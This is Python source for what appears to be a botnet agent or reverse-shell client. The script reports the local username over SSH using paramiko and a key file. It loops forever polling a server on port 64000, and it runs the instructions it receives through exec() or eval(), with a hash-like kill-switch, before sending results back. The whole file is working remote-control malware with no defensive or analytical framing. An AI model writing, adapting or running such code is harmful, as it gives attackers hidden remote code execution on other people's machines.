




import warnings
warnings.filterwarnings("ignore")

import os
import io
import sys
import time
import signal
import socket
import threading
import paramiko
import subprocess

parent_dir = os.path.dirname(os.path.abspath(__file__))


ssh_client = None
ssh_session = None
process = None

def exit_gracefully():
    global ssh_client, ssh_session, process
    

    
    if ssh_session and ssh_session.active:
        ssh_session.close()
    
    if ssh_client:
        ssh_client.close()
    
    
    if process and process.poll() is None:
        process.terminate()
        process.wait()

    
    sys.exit(0)


def signal_handler(sig, frame):
    exit_gracefully()


signal.signal(signal.SIGINT, signal_handler)



def dns_resolution(domain_name):
    try:
        
        ip_address = socket.gethostbyname(domain_name)
        return ip_address
    except socket.gaierror:
        
        return f"Error: Unable to resolve domain '{domain_name}'"


def exec_underlying_command(command):
    if isinstance(command, bytes):
        command = command.decode()

    stdout, stderr = None, None

    try:
        if os.name == 'nt':
            
            if command.startswith("curl "):
                command = command.replace("curl ", "curl.exe ", 1)

            process = subprocess.Popen(
                ["powershell.exe", "-NoProfile", "-Command", command],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                text=True
            )
        else:
            
            process = subprocess.Popen(
                command, shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

        stdout, stderr = process.communicate()

        if process.returncode == 0:
            result = (stdout or "").strip()
        else:
            result = (stderr or "Unknown error occurred").strip()

    except Exception as e:
        result = f"Exception occurred: {str(e)}"

    return result

command = "whoami".encode()
user = exec_underlying_command(command)



timeout = False
def max_timeout(seconds=20):
    global timeout
    time.sleep(seconds)
    timeout = True


def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
    global ssh_client, ssh_session, timeout
    ssh_client = paramiko.SSHClient()

    try:
        
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        
        private_key = paramiko.RSAKey.from_private_key_file(key_file)
        
        
        ssh_client.connect(ip, username=user, pkey=private_key, port=port)

        
        ssh_session = ssh_client.get_transport().open_session()
            
        server_instructions = None

        
        if ssh_session.active:
            ssh_session.send(bot_user.encode())

            
            timeout = False
            timeout_thread = threading.Thread(target=max_timeout, args=(300,))
            timeout_thread.daemon = True
            timeout_thread.start()

            while not timeout:
                try:
                    ssh_session.settimeout(1.0)
                    server_instructions = ssh_session.recv(4096)
                    
                    
                    server_instructions = server_instructions


                    if server_instructions:

                        
                        
                        
                        if server_instructions == b'3a01c2da6e340278db1fd04b6edeceae4736f077aba794179941c077a95f0d73':
                            ssh_session.close()
                            ssh_client.close()
                            return

                        
                        response = None


                        
                        if server_instructions.startswith(b'fe1482792327d18f5c73579b96d825266149d5e3c8522a6cddfbd90b0215f80e'):
                            server_instructions = server_instructions.removeprefix(b'fe1482792327d18f5c73579b96d825266149d5e3c8522a6cddfbd90b0215f80e')
                            try:
                                output = io.StringIO()
                                sys.stdout = output  

                                exec_globals = globals().copy()  
                                exec_locals = locals()  

                                exec(server_instructions, exec_globals, exec_locals)  

                                response = exec_locals.get("response", "")  

                                sys.stdout = sys.__stdout__  
                                response = output.getvalue() if output.getvalue() else str(response)  
                            except Exception as e:
                                response = f"Command failed:\t{e}"

                        else:
                            
                            server_instructions = server_instructions.decode()
                            try:
                                output = io.StringIO()
                                sys.stdout = output  
                                response = eval(server_instructions)
                                sys.stdout = sys.__stdout__  
                                response = output.getvalue() if output.getvalue() else str(response)  
                            except Exception as e:
                                response = f"Command failed:\t{e}"

                        ssh_session.send(response.encode())
                        

                        ssh_session.close()
                        ssh_client.close()
                        return

                except Exception as e:
                    pass


            ssh_session.close()
            ssh_client.close()
            response = f"Timeout while listening new instructions!"
            ssh_session.send(response.encode())

            return response
                
        time.sleep(100)

    except Exception as e:
        if ssh_session:
            ssh_session.close()
        if ssh_client:
            ssh_client.close()
        return f"Error: {e}"


if __name__ == "__main__":

    auth_path = os.path.join(parent_dir, 'mechanism')
    
    host = "localhost"

    
    while True:
        try:
            ssh_rev_shell(host, 'counter', auth_path, user, 64000)
        except Exception as e:
            time.sleep(60)
            pass

        
        time.sleep(0.5)
